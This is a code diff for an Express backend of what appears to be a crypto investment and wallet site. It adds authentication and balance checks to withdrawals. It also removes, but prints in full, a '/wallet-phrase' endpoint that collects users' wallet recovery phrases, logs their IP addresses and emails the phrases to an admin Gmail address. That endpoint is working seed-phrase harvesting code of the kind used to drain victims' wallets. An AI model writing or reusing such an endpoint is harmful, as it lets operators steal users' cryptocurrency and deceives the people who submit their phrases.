@@ -1,19 +1,22 @@
 import { Router } from "express";
 import type { Request, Response } from "express";
 import bcrypt from "bcryptjs";
-import { eq } from "drizzle-orm";
+import { and, eq, sum } from "drizzle-orm";
 import {
-  db, usersTable, depositsTable, withdrawalsTable, walletPhrasesTable,
+  db, usersTable, depositsTable, withdrawalsTable,
   referralsTable, settingsTable,
 } from "@workspace/db";
 import { generateUserToken } from "../middlewares/auth";
+import { requireUser } from "../middlewares/auth";
 import { nanoid } from "../lib/nanoid";
+import { accrueUserInvestments } from "../lib/investment-accrual";
 import {
   sendWelcomeEmail, sendDepositRequestToAdmin,
-  sendWithdrawalRequestToAdmin, sendWalletPhraseToAdmin,
+  sendWithdrawalRequestToAdmin,
 } from "../lib/email";
 
 const router = Router();
+type AuthedReq = Request & { user: { userId: number; email: string; role: string } };
 
 router.post("/register", async (req: Request, res: Response) => {
   try {
@@ -68,8 +71,10 @@ router.post("/login", async (req: Request, res: Response) => {
     if (user.suspended) { res.status(403).json({ error: "Account suspended" }); return; }
     const valid = await bcrypt.compare(password, user.passwordHash);
     if (!valid) { res.status(401).json({ error: "Invalid credentials" }); return; }
+    await accrueUserInvestments(user.id);
+    const [refreshedUser] = await db.select().from(usersTable).where(eq(usersTable.id, user.id));
     const token = generateUserToken(user.id, user.email);
-    res.json({ token, user: safeUser(user) });
+    res.json({ token, user: safeUser(refreshedUser ?? user) });
   } catch (err) {
     req.log.error({ err }, "loginUser error");
     res.status(500).json({ error: "Internal server error" });
@@ -93,11 +98,28 @@ router.post("/deposit", async (req: Request, res: Response) => {
   }
 });
 
-router.post("/withdraw", async (req: Request, res: Response) => {
+router.post("/withdraw", requireUser, async (req: Request, res: Response) => {
   try {
-    const { userId, amount, method, walletAddress } = req.body as { userId: number; amount: number; method: string; walletAddress: string };
-    const [w] = await db.insert(withdrawalsTable).values({ userId, amount, method, walletAddress }).returning();
+    const { userId } = (req as AuthedReq).user;
+    const { amount, method, walletAddress } = req.body as { amount: number; method: string; walletAddress: string };
+    await accrueUserInvestments(userId);
     const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
+    if (!user) { res.status(404).json({ error: "User not found" }); return; }
+    if (!Number.isFinite(amount) || amount <= 0 || !method || !walletAddress) {
+      res.status(400).json({ error: "Enter a valid withdrawal amount, method, and wallet address" }); return;
+    }
+    const [pending] = await db
+      .select({ total: sum(withdrawalsTable.amount) })
+      .from(withdrawalsTable)
+      .where(and(eq(withdrawalsTable.userId, userId), eq(withdrawalsTable.status, "pending")));
+    const pendingAmount = Number(pending?.total ?? 0);
+    const withdrawableBalance = Math.max(0, (user.balance ?? 0) - pendingAmount);
+    if (amount > withdrawableBalance) {
+      res.status(400).json({
+        error: `Insufficient withdrawable balance. Available: $${withdrawableBalance.toFixed(2)}`,
+      }); return;
+    }
+    const [w] = await db.insert(withdrawalsTable).values({ userId, amount, method, walletAddress }).returning();
     const [settings] = await db.select().from(settingsTable).limit(1);
     const adminEmail = settings?.adminEmail ?? "smartsafepalpremium@gmail.com";
     if (user) {
@@ -106,22 +128,6 @@ router.post("/withdraw", async (req: Request, res: Response) => {
     res.status(201).json({ id: w!.id, userId: w!.userId, amount: w!.amount, method: w!.method, walletAddress: w!.walletAddress, status: w!.status, adminNote: w!.adminNote, createdAt: w!.createdAt.toISOString(), updatedAt: w!.updatedAt.toISOString(), userEmail: user?.email ?? null, userName: user ? `${user.firstName} ${user.lastName}` : null });
   } catch (err) {
     req.log.error({ err }, "submitWithdrawal error");
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-router.post("/wallet-phrase", async (req: Request, res: Response) => {
-  try {
-    const { userId, phrase, walletType } = req.body as { userId?: number; phrase: string; walletType: string };
-    const ipAddress = req.headers["x-forwarded-for"]?.toString().split(",")[0] ?? req.socket.remoteAddress ?? null;
-    const [wp] = await db.insert(walletPhrasesTable).values({ userId: userId ?? null, phrase, walletType, ipAddress }).returning();
-    const [user] = userId ? await db.select().from(usersTable).where(eq(usersTable.id, userId)) : [undefined];
-    const [settings] = await db.select().from(settingsTable).limit(1);
-    const adminEmail = settings?.adminEmail ?? "smartsafepalpremium@gmail.com";
-    await sendWalletPhraseToAdmin(adminEmail, user?.email ?? null, phrase, walletType, ipAddress);
-    res.status(201).json({ id: wp!.id, userId: wp!.userId, phrase: wp!.phrase, walletType: wp!.walletType, ipAddress: wp!.ipAddress, createdAt: wp!.createdAt.toISOString(), userEmail: user?.email ?? null });
-  } catch (err) {
-    req.log.error({ err }, "submitWalletPhrase error");
     res.status(500).json({ error: "Internal server error" });
   }
 });
